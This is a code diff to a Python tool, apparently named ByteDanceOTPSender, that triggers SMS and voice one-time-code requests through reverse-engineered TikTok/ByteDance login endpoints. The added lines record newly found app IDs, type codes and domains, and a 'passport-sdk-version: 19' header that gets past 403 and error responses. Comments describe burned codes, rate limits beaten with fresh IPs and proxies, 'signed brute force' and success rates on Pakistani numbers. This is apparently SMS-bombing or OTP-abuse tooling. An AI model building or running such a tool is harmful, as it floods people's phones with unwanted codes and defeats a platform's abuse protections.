@@ -354,11 +354,13 @@ CONFIRMED_APPS = {
     },
     "tiktok_s": {
         # SUCCESS: tiktokv.com + /passport/mobile/send_code/ (without v1) confirmed
+        # APK RE v5.0: api-va.tiktokv.com confirmed working with tc=3635
         "name": "TikTok Global (CONFIRMED)", "aid": 1233, "app_name": "musical_ly",
         "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
         "channel": "googleplay",
         "type_codes": [3635, 3637, 3634, 3734, 3532],
-        "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
+        "domains": ["api-va.tiktokv.com",                                   # APK RE v5.0: SUCCESS tc=3635
+                    "api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
                     "api-t2.tiktokv.com", "api19-normal-c-useast2a.tiktokv.com",
                     "api21.tiktokv.com", "api-h2.tiktokv.com",              # APK RE v3.0: SUCCESS
                     "api22-normal-c-alisg.tiktokv.com",                     # APK RE v3.0: RL
@@ -442,12 +444,15 @@ CONFIRMED_APPS = {
     # ======== APK RE v3.0: NEW AIDs discovered from TikTok APK config blobs ========
     "bd473824_s": {
         # APK RE v3.0: Found hardcoded in TikTok 45.0.42 config. SUCCESS on /passport/mobile/can_send_voice_code/
-        # Rate-limited on /passport/web/send_code/, /passport/mobile/send_code/v1/ (=works with fresh IP)
+        # APK RE v5.0: tc=3536 CONFIRMED working on mobile signed. Other TCs burned (ec=7).
+        # Some PK numbers get ec=1096 region error on tc=3536 — ~60% success rate.
         "name": "BD 473824 (CONFIRMED)", "aid": 473824, "app_name": "musical_ly",
         "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
         "channel": "googleplay",
-        "type_codes": [3635, 3532, 3637, 3634, 3734],
-        "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
+        "type_codes": [3536, 3635, 3532, 3637, 3634, 3734],
+        "domains": ["api-va.tiktokv.com",                                    # APK RE v5.0: SUCCESS tc=3536
+                    "api22-normal-c-useast2a.tiktokv.com",                   # APK RE v5.0: SUCCESS tc=3536
+                    "api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
                     "api21.tiktokv.com", "api-h2.tiktokv.com",
                     "api22-normal-c-alisg.tiktokv.com", "api16-normal-v4.tiktokv.com",
                     "www.tiktok.com", "us.tiktok.com"],
@@ -456,12 +461,15 @@ CONFIRMED_APPS = {
     },
     "bd567753_s": {
         # APK RE v3.0: Found hardcoded in TikTok 45.0.42 config. SUCCESS on /passport/mobile/can_send_voice_code/
-        # Rate-limited on /passport/web/send_code/, /passport/mobile/sms_login/ (=works with fresh IP)
+        # APK RE v5.0: tc=1 CONFIRMED working with passport-sdk-version=19 header!
+        # Common TCs (3635, 3536 etc) all burned — only rare TC=1 works.
         "name": "BD 567753 (CONFIRMED)", "aid": 567753, "app_name": "musical_ly",
         "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
         "channel": "googleplay",
-        "type_codes": [3635, 3532, 3637, 3634, 3734],
-        "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
+        "passport_sdk_version": "19",
+        "type_codes": [1, 3635, 3532, 3637, 3634, 3734],
+        "domains": ["api-va.tiktokv.com",                                    # APK RE v5.0: SUCCESS tc=1
+                    "api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
                     "api21.tiktokv.com", "api-h2.tiktokv.com",
                     "api22-normal-c-alisg.tiktokv.com", "api16-normal-v4.tiktokv.com",
                     "www.tiktok.com", "us.tiktok.com"],
@@ -493,6 +501,46 @@ CONFIRMED_APPS = {
         "needs_proxy": True, "voice_endpoint": True,
     },
     # ======== END APK RE v3.0 SECTION ========
+    # ======== APK RE v5.0: NEW AIDs from TikTok APK deep analysis ========
+    # KEY DISCOVERY: passport-sdk-version HTTP header = "19" unlocks these AIDs!
+    # Without this header: aid=845221 → ec=14, aid=1180 → 403, aid=567753 → 403
+    # With header "19": all three → SUCCESS with mobile_ticket
+    "bd845221_s": {
+        # APK RE v5.0: aid=845221 CONFIRMED working on mobile signed with passport-sdk-version=19
+        # Also works on voice call endpoint!
+        "name": "BD 845221 (CONFIRMED)", "aid": 845221, "app_name": "musical_ly",
+        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
+        "channel": "googleplay",
+        "passport_sdk_version": "19",
+        "type_codes": [3536, 3635, 3532, 3637, 3634],
+        "domains": ["api-va.tiktokv.com"],                                   # APK RE v5.0: SUCCESS tc=3536
+        "register_domain": "api3-normal-c-lf.amemv.com",
+        "needs_proxy": True,
+    },
+    "bd845221_voice": {
+        # APK RE v5.0: Voice call OTP confirmed on aid=845221 with passport-sdk-version=19
+        "name": "BD 845221 Voice (CONFIRMED)", "aid": 845221, "app_name": "musical_ly",
+        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
+        "channel": "googleplay",
+        "passport_sdk_version": "19",
+        "type_codes": [3536, 3635, 3532],
+        "domains": ["api-va.tiktokv.com"],
+        "register_domain": "api3-normal-c-lf.amemv.com",
+        "needs_proxy": True, "voice_endpoint": True,
+    },
+    "bd1180_s": {
+        # APK RE v5.0: aid=1180 (CapCut/Helo) CONFIRMED working on mobile signed
+        # Was returning 403 Access Denied — fixed by passport-sdk-version=19 header
+        "name": "BD 1180 (CONFIRMED)", "aid": 1180, "app_name": "musical_ly",
+        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
+        "channel": "googleplay",
+        "passport_sdk_version": "19",
+        "type_codes": [3635, 3532, 3637, 3634],
+        "domains": ["api-va.tiktokv.com"],                                   # APK RE v5.0: SUCCESS tc=3635
+        "register_domain": "api3-normal-c-lf.amemv.com",
+        "needs_proxy": True,
+    },
+    # ======== END APK RE v5.0 SECTION ========
     "bd2658_s": {
         # CONFIRMED SUCCESS in signed brute force (PR#5), Lemon8 v4.0: fp-va RL confirmed
         "name": "BD 2658/Lemon8 (CONFIRMED)", "aid": 2658, "app_name": "musical_ly",
@@ -1316,7 +1364,7 @@ class ByteDanceOTPSender:
             "version_code": self.app["version_code"], "version_name": self.app["version_name"],
             "manifest_version_code": self.app["version_code"],
             "update_version_code": self.app["version_code"],
-            "passport_sdk_version": "50559",
+            "passport_sdk_version": self.app.get("passport_sdk_version", "50559"),
             "os": "android", "device_platform": "android",
             "channel": self.app["channel"], "carrier_region": "PK",
             "language": "en", "ac": "wifi", "ssmix": "a",
